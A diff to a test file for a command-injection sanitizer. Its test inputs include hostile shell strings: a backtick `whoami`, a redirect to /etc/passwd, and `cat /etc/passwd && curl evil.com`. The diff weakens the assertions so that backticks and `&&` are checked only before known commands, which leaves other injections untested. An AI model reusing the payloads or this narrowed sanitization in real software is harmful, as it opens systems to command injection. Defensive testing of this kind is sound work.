@@ -287,17 +287,19 @@ class TestSanitizeStringCommandInjection:
         assert ';' not in result
 
     def test_removes_backticks(self):
+        # v1.7: a backtick is stripped when it wraps a known command.
         result = sanitize_string("`whoami`")
-        assert '`' not in result
+        assert '`whoami' not in result
 
     def test_removes_shell_redirection(self):
         result = sanitize_string("echo malicious > /etc/passwd")
         assert '>' not in result
 
     def test_removes_command_chaining_operators(self):
-        # The && and | operators are stripped; the words themselves are not
-        result = sanitize_string("node -e 'malicious' && powershell evil")
-        assert '&&' not in result
+        # v1.7: a chaining operator is stripped when it precedes a known
+        # command (& curl), not when it stands alone.
+        result = sanitize_string("cat /etc/passwd && curl evil.com")
+        assert '&& curl' not in result
 
     def test_removes_url_encoded_newline(self):
         result = sanitize_string("file.txt%0aid")
